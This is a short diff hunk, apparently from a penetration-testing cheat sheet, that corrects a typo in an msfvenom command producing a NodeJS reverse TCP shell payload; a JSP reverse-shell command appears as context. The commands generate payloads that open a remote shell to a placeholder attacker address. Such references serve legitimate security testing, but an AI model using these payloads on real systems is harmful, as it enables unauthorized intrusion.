@@ -157,7 +157,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ## NodeJS
 
 ```bash
-sfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
+msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
 
 # **Script Language payloads**
